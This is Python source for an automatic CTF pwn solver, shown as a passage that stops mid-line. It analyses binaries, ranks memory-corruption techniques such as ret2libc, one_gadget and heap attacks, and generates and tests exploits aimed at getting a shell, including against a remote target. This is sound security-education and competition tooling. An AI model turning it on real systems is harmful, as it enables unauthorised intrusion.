#!/usr/bin/env python3
"""
PwnSolver - 便携式自动PWN解题框架
支持自动分析二进制文件、识别漏洞类型、生成exploit
"""

import os
import sys
import json
import argparse
import shutil
import subprocess
import tempfile
from pathlib import Path

# 确保可以在任何位置导入
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from analyzer import BinaryAnalyzer
from gadget_finder import GadgetFinder
from interactor import BinaryInteractor
from utils import exploit_python
from exploit_templates import (
    Ret2WinExploit,
    Ret2LibcExploit,
    ROPExploit,
    FormatStringExploit,
    ShellcodeExploit,
    OneGadgetExploit,
    StackPivotExploit,
    HeapExploit,
    BadBoyArrayOOBExploit,
    YesOrNoExploit,
    Ret2SyscallExploit,
    GoStackExploit,
    OrangeCatDiaryExploit,
)

class PwnSolver:
    """自动PWN解题器"""

    VULN_TYPES = {
        'ret2win': '存在win函数可直接跳转',
        'ret2libc': '需要泄露libc地址构造system("/bin/sh")',
        'rop': '需要构造ROP链',
        'format_string': '格式化字符串漏洞',
        'shellcode': '可执行栈/堆上的shellcode',
        'one_gadget': 'one_gadget直接getshell',
    }

    def __init__(self, binary_path, libc_path=None, remote=None, verbose=True, ld_path=None,
                 enable_reverse_skill=True, skill_root=None, recon_workdir=None,
                 deep_r2_analysis=False):
        self.binary_path = os.path.abspath(binary_path)
        self.libc_path = os.path.abspath(libc_path) if libc_path else None
        self.ld_path = os.path.abspath(ld_path) if ld_path else None
        self.remote = remote  # (host, port)
        self.verbose = verbose

        # reverse-skill 集成开关（默认开启）
        self.enable_reverse_skill = enable_reverse_skill
        self.skill_root = skill_root
        self.recon_workdir = recon_workdir
        self.deep_r2_analysis = deep_r2_analysis
        self.reverse_intel = None
        self.reverse_playbook = None
        self.original_binary_path = None

        if not os.path.exists(self.binary_path):
            raise FileNotFoundError(f"Binary not found: {self.binary_path}")

        self.log("[*] 初始化 PwnSolver...  (reverse-skill 增强: {})".format(
            "ON" if self.enable_reverse_skill else "OFF"))

        # Step -1: reverse-skill 分诊——UPX 样本先解包到临时副本。
        # 原始样本保留不动，符合 competition-reverse-pwn 的 artifact 保留原则。
        if self.enable_reverse_skill:
            self._maybe_unpack_upx()

        # Step 0: 自动检测 libc / ld（离线优先：同目录附件 → 上级目录 → 本地符号索引 → 系统 libc 兜底）
        self.libc_source = None    # user | sibling | neighbor | index | system
        self.libc_suspect = False  # 系统 libc 兜底：只能本地自测，打远程必须换靶机 libc
        self.libc_version = None
        if not self.libc_path:
            try:
                from badchars import detect_libc_ex
                info = detect_libc_ex(self.original_binary_path or self.binary_path)
                if info.get('path'):
                    self.libc_path = info['path']
                    self.libc_source = info.get('source')
                    self.libc_suspect = bool(info.get('suspect'))
                    self.libc_version = info.get('version')
                    if not self.ld_path and info.get('loader'):
                        self.ld_path = info['loader']
                    if verbose:
                        src = {'sibling': '同目录附件', 'neighbor': '上级目录附件',
                               'index': '本地符号索引', 'system': '系统 libc 兜底'}.get(
                                   self.libc_source, self.libc_source)
                        version = f" [glibc {self.libc_version}]" if self.libc_version else ""
                        print(f"  🔍 自动检测到libc({src}): "
                              f"{os.path.basename(self.libc_path)}{version}")
                        if info.get('note'):
                            print(f"      {info['note']}")
            except ImportError:
                pass
        if self.libc_path and not self.libc_source:
            self.libc_source = 'user'
        if self.libc_suspect and verbose:
            print("  ⚠ 当前 libc 来自本机系统兜底：本地自测可用，"
                  "远程利用前请用 -l 换成靶机 libc（否则 system/one_gadget 偏移是错的）")
        if not self.ld_path:
            try:
                from badchars import auto_detect_ld
                detected_ld = auto_detect_ld(
                    self.original_binary_path or self.binary_path,
                    self.libc_path,
                )
                if detected_ld:
                    self.ld_path = detected_ld
                    if verbose:
                        print(f"  🔍 自动检测到ld: {os.path.basename(detected_ld)}")
            except ImportError: pass

        # 核心组件
        self.analyzer = BinaryAnalyzer(self.binary_path, verbose=verbose)
        self.gadget_finder = GadgetFinder(self.binary_path, self.libc_path, verbose=verbose)
        self.interactor = None  # 延迟创建

        # 分析结果
        self.vuln_type = None
        self.exploit = None
        self.exploit_result = None

    def _is_locally_runnable_dynamic_elf(self):
        """本地求解场景判断: 目标是 x86/x64 动态链接 ELF 且本机可执行。

        通过遍历 PT_INTERP 判断动态链接 (而非读固定偏移, stripped 二进制 interp
        不在固定文件位置), 并校验架构与本机一致。
        """
        import platform
        try:
            from pwn import ELF as _ELF
            elf = _ELF(self.original_binary_path or self.binary_path, checksec=False)
            # PT_INTERP 存在 = 动态链接, 有 loader
            interp = ''
            try:
                for seg in elf.segments:
                    if seg.header.p_type == 'PT_INTERP':
                        interp = bytes(seg.data()).decode(errors='ignore').rstrip('\x00')
                        break
            except Exception:
                pass
            if not interp:
                return False
            # pwntools e_machine 可能是字符串('EM_X86_64')或整数
            machine_map = {3: 'i386', 62: 'amd64', 183: 'aarch64', 40: 'arm',
                           'EM_386': 'i386', 'EM_X86_64': 'amd64',
                           'EM_AARCH64': 'aarch64', 'EM_ARM': 'arm'}
            e_machine = elf.header.e_machine
            arch = machine_map.get(e_machine) or machine_map.get(getattr(e_machine, 'value', None))
            host = platform.machine().lower()
            host_norm = 'amd64' if host in ('x86_64', 'amd64') else ('i386' if host in ('i686', 'x86', 'i386') else host)
            # amd64 宿主可跑 i386, 反之不可
            if arch not in (host_norm, {'amd64': 'i386'}.get(host_norm)):
                return False
            return True
        except Exception:
            return False

    def _system_libc_candidates(self):
        """本机系统 libc 路径候选 (按优先级)。"""
        import glob as _glob
        import platform
        machine = platform.machine().lower()
        out = []
        if platform.system() == 'Linux':
            arch_dir = 'i386-linux-gnu' if machine in ('i686', 'x86', 'i386') else 'x86_64-linux-gnu'
            out += [f'/usr/lib/{arch_dir}/libc.so.6', f'/lib/{arch_dir}/libc.so.6']
        elif platform.system() == 'Windows':
            # WSL 场景: solver 在 WSL 内运行时上面 Linux 分支已覆盖; 从 Windows
            # 直接运行时由 RuntimeRouter 转发到 WSL, 这里不会触达。
            pass
        for pat in ('/lib/x86_64-linux-gnu/libc.so.6', '/lib/i386-linux-gnu/libc.so.6'):
            if pat not in out:
                out.append(pat)
        return out

    def _maybe_unpack_upx(self):
        """reverse-skill elf-analysis.md: UPX! 标记 -> upx -d 到临时副本。"""
        upx = shutil.which("upx")
        if not upx:
            return
        try:
            with open(self.binary_path, "rb") as fh:
                prefix = fh.read(4 * 1024 * 1024)
            if b"UPX!" not in prefix:
                return

            self.log("  [*] 检测到 UPX 壳，尝试安全解包（原始文件保持只读）...")
            unpack_dir = tempfile.mkdtemp(prefix="pwnsolver_upx_")
            unpacked = os.path.join(unpack_dir, os.path.basename(self.binary_path) + ".unpacked")
            r = subprocess.run(
                [upx, "-d", self.binary_path, "-o", unpacked],
                capture_output=True, text=True, timeout=60,
            )
            if r.returncode == 0 and os.path.exists(unpacked):
                self.original_binary_path = self.binary_path
                self.binary_path = os.path.abspath(unpacked)
                self.log(f"  [+] UPX 解包成功: {self.binary_path}")
            else:
                self.log(f"  [!] UPX 解包失败，继续按原文件分析: {(r.stderr or r.stdout).strip()[:160]}")
                shutil.rmtree(unpack_dir, ignore_errors=True)
        except Exception as exc:
            self.log(f"  [!] UPX 自动解包跳过: {exc}")

    def log(self, msg):
        if self.verbose:
            print(msg, flush=True)

    def analyze(self):
        """全面分析二进制文件"""
        self.log("\n" + "=" * 60)
        self.log("[*] 阶段1: 二进制分析")
        self.log("=" * 60)

        # 基本信息
        info = self.analyzer.basic_info()
        self.log(f"  [+] 文件类型: {info['type']}")
        self.log(f"  [+] 架构: {info['arch']}")
        self.log(f"  [+] 位数: {info['bits']}")

        # 安全机制
        protections = self.analyzer.checksec()
        self.log(f"  [+] 安全机制:")
        for k, v in protections.items():
            self.log(f"      {k}: {'启用' if v else '禁用'}")

        # 函数分析
        functions = self.analyzer.find_interesting_functions()
        self.log(f"  [+] 危险函数: {functions.get('dangerous', [])}")
        self.log(f"  [+] 有用函数: {functions.get('useful', [])}")
        self.log(f"  [+] Win函数: {functions.get('win', [])}")

        # 字符串
        interesting_strings = self.analyzer.find_interesting_strings()
        self.log(f"  [+] 关键字符串: {interesting_strings[:5]}...")

        # 缓冲区信息
        buffers = self.analyzer.find_buffer_sizes()
        self.log(f"  [+] 缓冲区信息: {buffers}")

        result = {
            'info': info,
            'protections': protections,
            'functions': functions,
            'buffers': buffers,
            'strings': interesting_strings,
        }
        # 堆菜单信息并入顶层 (阶段3使用)
        hm = functions.get('heap_menu') or {}
        if hm:
            result['heap_menu'] = hm
            self.log(f"  [+] 堆菜单检测: {hm.get('heap_menu')} (free={hm.get('free_count')} calloc={hm.get('calloc_count')} scanf={hm.get('scanf_count')})")

        # 新增检测结果日志
        ao = functions.get('array_overflow') or {}
        if ao.get('array_overflow'):
            self.log(f"  [+] 数组溢出检测: 负索引={'可' if ao.get('negative_index_possible') else '否'} leak={'可' if ao.get('leak_possible') else '否'}")
        pi = functions.get('prng_info') or {}
        if pi.get('prng_detected'):
            self.log(f"  [+] PRNG检测: srand={pi.get('srand_found')} rand={pi.get('rand_found')} seed={pi.get('seed_source')}")
        if functions.get('is_go_binary'):
            self.log(f"  [+] Go binary检测: 是 (使用syscall.Exec等Go特定方法)")
        sp = functions.get('stack_pivot') or {}
        if sp.get('stack_pivot'):
            self.log(f"  [+] 栈迁移检测: lift={sp.get('stack_lift')} migrate={sp.get('stack_migrate')}")

        # reverse-skill: Deep Recon（rabin2/file/strings 结构化分诊）
        if self.enable_reverse_skill:
            self._apply_deep_recon(result)

        self.analysis = result  # 缓存供StrategyEngine使用
        return result

    def _apply_deep_recon(self, analysis):
        """阶段1.5: reverse-skill 深度侦察，并把结果合并进 analysis。"""
        self.log("\n" + "=" * 60)
        self.log("[*] 阶段1.5: reverse-skill 深度侦察 (Deep Recon)")
        self.log("=" * 60)
        try:
            from deep_recon import DeepRecon

            # Evidence 始终针对原始 artifact；UPX 解包副本只用于后续 exploit 分析。
            recon_target = self.original_binary_path or self.binary_path
            recon = DeepRecon(
                recon_target,
                verbose=self.verbose,
                workdir=self.recon_workdir,
                run_r2_analysis=self.deep_r2_analysis,
            )
            intel = recon.run()
            intel['analysis_binary_path'] = self.binary_path
            self.reverse_intel = intel
            analysis['reverse_intel'] = intel
            analysis['_binary_path'] = self.binary_path
            analysis['_libc_path'] = self.libc_path

            # 合并 rabin2 的结构化证据到顶层，便于决策链消费
            info = analysis.get('info', {})
            info['binary_path'] = self.binary_path
            info['original_binary_path'] = self.original_binary_path or self.binary_path
            r2info = intel.get('info') or {}
            if isinstance(r2info, dict):
                info.setdefault('file_type', intel.get('file_type'))
                if r2info.get('bintype'):
                    info.setdefault('raw_type', r2info.get('bintype'))
                if r2info.get('compiler'):
                    info.setdefault('compiler', r2info.get('compiler'))
                if r2info.get('lang'):
                    info.setdefault('lang', r2info.get('lang'))

            funcs = analysis.get('functions', {})
            lang = intel.get('language') or {}
            packed = intel.get('packed') or {}
            anti = intel.get('anti_analysis') or {}
            funcs['reverse_language'] = lang
            funcs['packed'] = packed
            funcs['anti_analysis'] = anti
            funcs['reverse_imports'] = [
                (str(i.get('name')), hex(int(i.get('plt', 0))))
                for i in intel.get('imports', [])
                if i.get('name')
            ]
            if lang.get('go') and not funcs.get('is_go_binary'):
                funcs['is_go_binary'] = True
            if r2info.get('stripped'):
                funcs['stripped'] = True

            # 证据落盘: pwnsolver_evidence/<binary>.recon.json|md
            evidence = recon.write_evidence(intel)
            analysis['reverse_evidence'] = evidence
            self.log(f"  [+] recon 证据: {evidence['json']}")
            self.log(f"  [+] sha256: {intel.get('sha256')}  entropy: {intel.get('entropy')}")
            self.log(f"  [+] packer: {packed.get('packed')} ({packed.get('packer') or 'none'})  confidence={packed.get('confidence', 0)}")
            self.log(f"  [+] language: go={lang.get('go')} rust={lang.get('rust')} cpp={lang.get('cpp')} protobuf_c={lang.get('protobuf_c')} stripped={r2info.get('stripped')}")
            self.log(f"  [+] anti-analysis: {anti.get('anti_analysis')} seccomp={anti.get('seccomp')}")
            tooling = intel.get('tooling') or {}
            if tooling.get('need_x86_container'):
                self.log("  [!] Apple Silicon + x86 ELF: 建议用 scripts/pwn-x86 进入 amd64 容器解题")
        except FileNotFoundError:
            self.log("  [-] DeepRecon 模块不存在，跳过 reverse-skill 侦察")
        except Exception as e:
            self.log(f"  [!] DeepRecon 失败，保留基础分析继续: {e}")

    def build_reverse_playbook(self, analysis=None, gadgets=None):
        """生成并保存 reverse-skill playbook；在漏洞类型确定后调用。"""
        analysis = analysis or getattr(self, 'analysis', None)
        gadgets = gadgets or getattr(self, 'gadgets', None)
        if not self.enable_reverse_skill or not analysis:
            return None
        try:
            from reverse_skill import PlaybookBuilder, SkillLibrary

            analysis['_vuln_type'] = self.vuln_type[0] if isinstance(self.vuln_type, tuple) else self.vuln_type
            library = SkillLibrary(self.skill_root)
            playbook = PlaybookBuilder(library).build(analysis, gadgets or {})
            self.reverse_playbook = playbook

            evdir = analysis.get('reverse_evidence', {}).get('evidence_dir')
            if evdir:
                stem = Path(self.binary_path).stem or 'binary'
                md_path = os.path.join(evdir, f'{stem}.playbook.md')
                with open(md_path, 'w', encoding='utf-8') as f:
                    f.write(playbook['markdown'])
                playbook['markdown_path'] = md_path
                self.log(f"  [+] reverse-skill playbook: {md_path}")
            routes = playbook.get('routes', [])
            if routes:
                self.log(f"  [+] skill 路由: {' → '.join(r['id'] for r in routes[:4])}")
            return playbook
        except Exception as e:
            self.log(f"  [!] playbook 生成失败: {e}")
            return None

    def find_gadgets(self):
        """查找gadgets"""
        self.log("\n" + "=" * 60)
        self.log("[*] 阶段2: Gadget收集")
        self.log("=" * 60)

        # Go/CGO 二进制动辄数 MB，ROPgadget 全量扫描没有意义且会超时。
        analysis = getattr(self, 'analysis', {}) or {}
        funcs = analysis.get('functions') or {}
        lang = funcs.get('reverse_language') or {}
        if funcs.get('is_go_binary') or lang.get('go'):
            self.log("  [!] Go/CGO binary: 跳过全量 ROPgadget 扫描")
            try:
                pltgot = self.gadget_finder.get_plt_got()
                gadgets = {
                    'rop_gadgets': [],
                    'one_gadgets': self.gadget_finder.find_one_gadgets(),
                    'specific': {},
                    'pop_rdi_in_binary': False,
                    'plt': pltgot.get('plt', {}),
                    'got': pltgot.get('got', {}),
                    'libc_info': self.gadget_finder.get_libc_base_info(),
                    'skip_rop': True,
                    'go_binary': True,
                }
                self.gadgets = gadgets
                return gadgets
            except Exception as exc:
                self.log(f"  [!] Go gadgets 降级失败: {exc}")

        gadgets = self.gadget_finder.collect_all()

        # ROPgadgets
        self.log(f"  [+] ROP gadgets: {len(gadgets.get('rop_gadgets', []))} 个")

        # one_gadget
        og = gadgets.get('one_gadgets', [])
        if og:
            self.log(f"  [+] One gadgets: {len(og)} 个")
            for g in og[:5]:
                self.log(f"      {g}")
        else:
            self.log(f"  [-] 未找到one_gadget (没有libc?)")

        # PLT/GOT
        self.log(f"  [+] PLT entries: {list(gadgets.get('plt', {}).keys())[:10]}")
        self.log(f"  [+] GOT entries: {list(gadgets.get('got', {}).keys())[:10]}")

        self.gadgets = gadgets  # 缓存供StrategyEngine使用
        return gadgets

    def determine_vuln_type(self, analysis, gadgets):
        """自动判断漏洞类型"""
        self.log("\n" + "=" * 60)
        self.log("[*] 阶段3: 漏洞类型判断")
        self.log("=" * 60)

        funcs = analysis['functions']
        protections = analysis['protections']
        plt = gadgets.get('plt', {})
        has_dangerous = bool(funcs.get('dangerous'))
        has_leak = any(f in plt for f in ['puts', 'printf', 'write'])
        has_one_gadget = bool(gadgets.get('one_gadgets'))
        specific = gadgets.get('specific', {})
        has_pop_rdi = gadgets.get('pop_rdi_in_binary', bool(specific.get('pop_rdi')))

        candidates = []

        # 1. ret2win - 最高优先级（显式+推断win函数）
        # 但需要确认有实际的溢出风险（gets/scanf等不限制输入的函数）
        # fgets(buf, size, stdin) 是有界的，不构成栈溢出
        real_win = [(n, a) for n, a in funcs.get('win', [])
                    if not n.endswith('.c') and 'plt.' not in n and 'got.' not in n
                    and not n.startswith('_')]
        # stripped下从PLT/string/disasm推断的win
        implied_win = funcs.get('implied_win', [])
        # calls_<fn>@plt 是反汇编确认的"调用 win 函数"的函数入口, 比 PLT 桩地址
        # (system@plt+4 之类, 直接跳会因 rdi 未设置而失败) 可靠, 优先采纳
        calls_win = [(n, a) for n, a in implied_win if str(n).startswith('calls_')]
        if calls_win and funcs.get('win') is not None:
            try:
                cw_addr_val = int(calls_win[0][1], 16)
                if not any(int(str(a), 16) == cw_addr_val for _, a in funcs.get('win', [])):
                    funcs['win'] = list(funcs.get('win', [])) + [
                        (f'win_{calls_win[0][0]}', calls_win[0][1])]
                    real_win = [(n, a) for n, a in funcs['win']
                                if not n.endswith('.c') and 'plt.' not in n
                                and 'got.' not in n and not n.startswith('_')]
            except (ValueError, TypeError):
                pass
        has_system_plt = 'system' in plt
        has_binsh = funcs.get('has_binsh', False)
        pie_enabled = protections.get('pie', False)

        # 检测是否有无界输入函数（真正的溢出风险）
        unbounded_funcs = {'gets', 'scanf', 'read', 'strcpy', 'strcat', 'sprintf', 'memcpy'}
        danger_names = {n.split('.')[-1].lower() for n, _ in funcs.get('dangerous', [])}
        has_real_overflow = bool(unbounded_funcs & danger_names)
        # fgets 有界但也可与格式字符串结合，所以不能完全排除
        is_fgets_only = danger_names == {'fgets'} or (danger_names <= {'fgets', 'printf'})

        if real_win and has_real_overflow:
            confidence = 60 if pie_enabled else 100
            reason = f'存在win函数: {real_win[0][0]}'
            if pie_enabled:
                reason += ' (PIE→需leak)'
            candidates.append(('ret2win', confidence, reason))
            self.log(f"  [+] 候选: ret2win (置信度: {'需PIE leak' if pie_enabled else '最高'}) - {real_win[0][0]} @ {real_win[0][1]}")
        elif real_win and is_fgets_only:
            # 有win但只有fgets（有界输入），更多可能是格式字符串或其他
            self.log(f"  [!] 降级ret2win → format_string (有界输入+fgets, win={real_win[0][0]})")
            # 不添加ret2win，让format_string候选生效
        elif real_win and not has_real_overflow:
            # 有win但没有明显溢出 → 降低置信度
            candidates.append(('ret2win', 40, f'win存在但溢出路径不明: {real_win[0][0]}'))
            self.log(f"  [+] 候选: ret2win (置信度: 低) - win存在但溢出路径不明")
        elif implied_win:
            # stripped但推断出win路径
            candidates.append(('ret2win', 92, f'推断win路径: {implied_win[0][0]}'))
            self.log(f"  [+] 候选: ret2win (stripped推断) - {implied_win[0][0]} @ {implied_win[0][1]}")
            # 把推断出的 win 注入 functions.win, 让模板真正跳到 win 函数
            # (直接跳 system@plt 不可行 - rdi 未设置)
            try:
                iw_name, iw_addr = implied_win[0][0], implied_win[0][1]
                iw_addr_val = int(iw_addr, 16) if isinstance(iw_addr, str) else int(iw_addr)
                if iw_name.startswith('calls_') and funcs.get('win') is not None:
                    if not any(int(str(a), 16) == iw_addr_val for _, a in funcs.get('win', [])):
                        funcs['win'] = list(funcs.get('win', [])) + [(iw_name, hex(iw_addr_val))]
            except (ValueError, TypeError):
                pass
        elif has_system_plt and has_dangerous:
            # 即使没有明确的win，有system@plt+危险函数也是ret2win
            candidates.append(('ret2win', 80, f'system@plt+危险函数'))
            self.log(f"  [+] 候选: ret2win (推断) - system@plt存在")
        elif has_system_plt and has_binsh:
            candidates.append(('ret2win', 78, f'system@plt+/bin/sh'))
            self.log(f"  [+] 候选: ret2win (推断) - system@plt + /bin/sh")

        # 2. one_gadget - 有one_gadget优先(更简单，不需要leak也不需要pop_rdi)
        # seccomp/libseccomp 题目 execve 会被过滤，one_gadget 不应作为主策略。
        has_seccomp_funcs = any(f in plt for f in ('seccomp_init', 'seccomp_load', 'seccomp_rule_add'))
        if has_one_gadget and has_dangerous and not has_seccomp_funcs:
            candidates.append(('one_gadget', 95, '有one_gadget可直接getshell'))
            self.log(f"  [+] 候选: one_gadget (置信度: 最高) - 无需pop_rdi")
        elif has_one_gadget and has_seccomp_funcs:
            candidates.append(('one_gadget', 30, 'seccomp过滤execve，仅作备份'))
            self.log(f"  [+] 候选: one_gadget (置信度: 低) - seccomp 环境禁止 execve")

        # 3. ret2libc - 有pop_rdi时可用
        if has_dangerous and has_leak and protections.get('nx', True):
            # canary + 回显函数 -> 两阶段 canary 泄露模板已支持, 恢复高置信度
            echo_plt = any(f in plt for f in ('write', 'puts', 'printf'))
            canary_leakable = protections.get('canary') and echo_plt
            if has_pop_rdi or canary_leakable:
                conf = 85 if has_pop_rdi else 75
                why = 'pop_rdi' if has_pop_rdi else 'canary泄露路径(write/puts回显)'
                candidates.append(('ret2libc', conf, f'NX+溢出+输出函数+{why}'))
                self.log(f"  [+] 候选: ret2libc (置信度: {'高' if has_pop_rdi else '中高'}) - {why}")
            else:
                candidates.append(('ret2libc', 50, 'NX+溢出但无pop_rdi'))
                self.log(f"  [+] 候选: ret2libc (置信度: 低) - 无pop_rdi!")

        # 3.5 BadBoy array-OOB: 越界读泄露 stack/libc + 负数索引覆写 puts@got
        array_oob = funcs.get('array_overflow') or {}
        if array_oob.get('badboy_style'):
            candidates.append(('array_oob', 96, 'BadBoy式数组越界: stack/libc泄露 + 负索引写puts@got'))
            self.log(f"  [+] 候选: array_oob (置信度: 最高) - {array_oob.get('strategy_hint', 'BadBoy style')}")

        # 3.6 yes_or_no: 只有 read，反复进入 yes()，pop r12/r15 清 one_gadget 约束
        yon = funcs.get('yes_or_no_style') or {}
        if yon.get('yes_or_no'):
            candidates.append(('yes_or_no', 97, 'yes_or_no式抬栈 + one_gadget'))
            self.log(f"  [+] 候选: yes_or_no (置信度: 最高) - clear_r12={yon.get('clear_r12')} clear_r15={yon.get('clear_r15')}")


        # 4. format_string — 升级: 有win但无溢出→fmtstr写secret触发win
        if 'printf' in str(funcs.get('dangerous', [])):
            fmt_confidence = 60
            fmt_reason = '存在printf调用'
            # 如果有win但溢出路径不明, format_string可能是正确路径
            if real_win and not has_real_overflow:
                fmt_confidence = 85
                fmt_reason += ' + win函数(无溢出→fmtstr写变量)'
            candidates.append(('format_string', fmt_confidence, fmt_reason))
            self.log(f"  [+] 候选: format_string (置信度: {'高' if fmt_confidence >= 80 else '中'}) - {fmt_reason}")

        # 5. shellcode
        if has_dangerous and not protections.get('nx', True):
            candidates.append(('shellcode', 75, 'NX禁用+溢出'))
            self.log(f"  [+] 候选: shellcode (置信度: 中高)")

        # 6. heap - 检测malloc/free等堆函数
        has_heap_funcs = any(f in plt for f in ['malloc', 'free', 'calloc', 'realloc'])
        # 堆菜单检测: free/calloc/scanf + bss指针数组 (Add/Show/Edit/Delete菜单题)
        heap_menu = analysis.get('heap_menu') or {}
        is_heap_menu = bool(heap_menu.get('heap_menu'))
        if is_heap_menu:
            # 菜单堆题: 优先于one_gadget/ret2libc (它们的溢出假设不成立)
            candidates.append(('heap', 95, '堆菜单题(free+calloc+scanf+bss数组), 优先UAF/tcache'))
            self.log(f"  [+] 候选: heap (置信度: 最高) - 菜单堆题: free={heap_menu.get('free_count')} calloc={heap_menu.get('calloc_count')} scanf={heap_menu.get('scanf_count')}")
            if heap_menu.get('ptr_array'):
                self.log(f"  [+]      指针数组@0x{heap_menu['ptr_array']} (UAF/tcache dup可用)")
            # 降级栈类攻击(堆题通常无栈溢出)
            candidates = [c for c in candidates if c[0] not in ('one_gadget', 'ret2libc', 'ret2win', 'rop')]
            candidates.append(('one_gadget', 40, '备选(无栈溢出时不可用)'))
        elif has_heap_funcs and not candidates:
            candidates.append(('heap', 55, '检测到堆操作函数'))
            self.log(f"  [+] 候选: heap (置信度: 中) - 堆操作")
        elif has_heap_funcs:
            candidates.append(('heap', 40, '备选堆利用'))
            self.log(f"  [+] 备选: heap (置信度: 低)")

        # 7. 通用ROP
        if has_dangerous and protections.get('nx', True) and not candidates:
            candidates.append(('rop', 40, '默认ROP'))
            self.log(f"  [+] 候选: rop (置信度: 低)")

        if not candidates:
            self.log(f"  [!] 无法判断，默认ret2win尝试")
            candidates.append(('ret2win', 20, '默认'))

        # 泛化模式引擎 overlay：同名模式用更完整信号修正置信度
        try:
            from pattern_engine import PatternEngine
            if gadgets.get('skip_rop'):
                gadgets.setdefault('xor_gadgets', {})
            else:
                gadgets.setdefault('xor_gadgets', self.gadget_finder.find_xor_gadgets())
            pattern_matches = PatternEngine().classify(analysis, gadgets)
            analysis['pattern_matches'] = [m.to_dict() for m in pattern_matches]
            if pattern_matches:
                self.log(f"  [+] 泛化模式: {PatternEngine().summary(pattern_matches)}")
            for m in pattern_matches:
                vt = PatternEngine.VULN_MAP.get(m.pattern_id)
                if not vt or vt in ('packed', 'go', 'protocol'):
                    continue
                existing = next(((i, c) for i, c in enumerate(candidates) if c[0] == vt), None)
                if existing is None or m.confidence > existing[1][1]:
                    if existing is not None:
                        candidates.pop(existing[0])
                    candidates.append((vt, m.confidence, '; '.join(m.reasons)))
        except Exception as exc:
            self.log(f"  [!] 泛化模式引擎不可用: {exc}")

        candidates.sort(key=lambda x: x[1], reverse=True)
        self.vuln_type = candidates[0]
        self.log(f"\n  [*] 选择策略: {self.vuln_type[0]} (置信度: {self.vuln_type[1]})")

        return self.vuln_type

    def generate_exploit(self, analysis, gadgets):
        """生成exploit代码"""
        self.log("\n" + "=" * 60)
        self.log("[*] 阶段4: 生成Exploit")
        self.log("=" * 60)

        vuln_type = self.vuln_type[0]

        exploit_map = {
            'ret2win': Ret2WinExploit,
            'ret2libc': Ret2LibcExploit,
            'rop': ROPExploit,
            'format_string': FormatStringExploit,
            'shellcode': ShellcodeExploit,
            'one_gadget': OneGadgetExploit,
            'stack_pivot': StackPivotExploit,
            'heap': HeapExploit,
            'array_oob': BadBoyArrayOOBExploit,
            'yes_or_no': YesOrNoExploit,
            'ret2syscall': Ret2SyscallExploit,
            'go_stack': GoStackExploit,
            'orange_cat': OrangeCatDiaryExploit,
        }

        ExploitClass = exploit_map.get(vuln_type)
        if not ExploitClass:
            self.log(f"  [!] 不支持的漏洞类型: {vuln_type}")
            return None

        self.exploit = ExploitClass(
            binary_path=self.binary_path,
            analysis=analysis,
            gadgets=gadgets,
            libc_path=self.libc_path,
            remote_target=self.remote,
            verbose=self.verbose,
            ld_path=self.ld_path,
        )

        code = self.exploit.generate()
        self.log(f"  [+] Exploit代码生成完毕 ({len(code)} bytes)")

        return code

    def _cleanup_cores(self):
        """清理core dump文件 (在binary所在目录和cores/)"""
        import glob
        dirs = [os.path.dirname(os.path.abspath(self.binary_path)), '.']
        for d in dirs:
            for pat in ['core', 'core.*', 'cores/core.*']:
                for f in glob.glob(os.path.join(d, pat)):
                    try: os.remove(f)
                    except: pass

    def test_exploit(self, timeout=None):
        """本地测试exploit — 返回结构化反馈"""
        if timeout is None:
            timeout = getattr(self, '_test_timeout', 10)
        self._cleanup_cores()  # 测试前清理旧core
        self.log("\n" + "=" * 60)
        self.log("[*] 阶段5: 本地测试Exploit")
        self.log("=" * 60)

        if not self.exploit:
            self.log("  [-] 没有可测试的exploit")
            return False

        # 优先使用结构化反馈
        if hasattr(self.exploit, 'test_with_feedback'):
            feedback = self.exploit.test_with_feedback(timeout=timeout)
            success = feedback.get('success', False) if isinstance(feedback, dict) else getattr(feedback, 'success', False)
            if success:
                self.log(f"  [+] 本地测试成功!")
                note = feedback.get('note') if isinstance(feedback, dict) else None
                if note:
                    self.log(note)
            else:
                err = feedback.get('error_type', 'unknown') if isinstance(feedback, dict) else getattr(feedback, 'error_type', 'unknown')
                crash = feedback.get('crash_addr') if isinstance(feedback, dict) else getattr(feedback, 'crash_addr', None)
                exit_code = feedback.get('exit_code') if isinstance(feedback, dict) else getattr(feedback, 'exit_code', None)
                msg = f"  [-] 本地测试失败: {err}"
                if crash:
                    msg += f" @ {hex(crash)}"
                if exit_code is not None:
                    msg += f" (exit={exit_code})"
                self.log(msg)
                # 输出截断的 stdout/stderr 供诊断
                stdout = feedback.get('stdout', '') if isinstance(feedback, dict) else ''
                stderr = feedback.get('stderr', '') if isinstance(feedback, dict) else ''
                if stderr and stderr != 'timeout':
                    self.log(f"      stderr: {stderr[:200]}")
            # 缓存反馈供自适应循环使用
            self._last_feedback = feedback
            if not success:
                leaks = feedback.get('leaks') if isinstance(feedback, dict) else None
                if leaks and self._resolve_libc_from_leaks(leaks):
                    # libc 换了 → 让调用方重新生成 exploit（GadgetFinder 已重建）
                    self._libc_changed = True
            return success
        else:
            result = self.exploit.test_local(timeout=timeout)
            if result:
                self.log(f"  [+] 本地测试成功!")
            else:
                self.log(f"  [-] 本地测试失败")
            return result

    def _resolve_libc_from_leaks(self, leaks):
        """用泄露地址在本地索引里反查 libc，命中就换掉当前 libc 并重建 gadget。

        只在"当前 libc 不是题目附件、也不是用户 -l 指定"时才覆盖 —— 附件与显式指定永远优先。
        这是断网环境下识别未知 libc 的唯一途径（不再依赖 libc.rip 之类的云 API）。
        返回 True 表示 libc 已替换。
        """
        if not leaks:
            return False
        if self.libc_source in ('user', 'sibling', 'neighbor'):
            return False
        try:
            from badchars import detect_libc_ex
            from libc_db import arch_of
        except ImportError:
            return False
        target = self.original_binary_path or self.binary_path
        try:
            info = detect_libc_ex(target, leaks=leaks, arch=arch_of(target))
        except Exception as exc:
            self.log(f"  [libc] 泄露反查异常: {exc}")
            return False
        if info.get('source') != 'index' or not info.get('path'):
            self.log(f"  [libc] 泄露 {', '.join(f'{k}={hex(v)}' for k, v in leaks.items())} "
                     "未在本地索引匹配到（可扩充 libcs/ 后重跑 libcdb build）")
            return False
        new_path = os.path.abspath(info['path'])
        if self.libc_path and os.path.abspath(self.libc_path) == new_path:
            return False
        old = os.path.basename(self.libc_path) if self.libc_path else '无'
        self.libc_path = new_path
        self.libc_source = 'index'
        self.libc_suspect = False
        self.libc_version = info.get('version')
        if info.get('loader'):
            self.ld_path = info['loader']
        self.gadget_finder = GadgetFinder(self.binary_path, self.libc_path, verbose=self.verbose)
        self.log(f"  [libc] 由泄露反查: {old} → {os.path.basename(new_path)}"
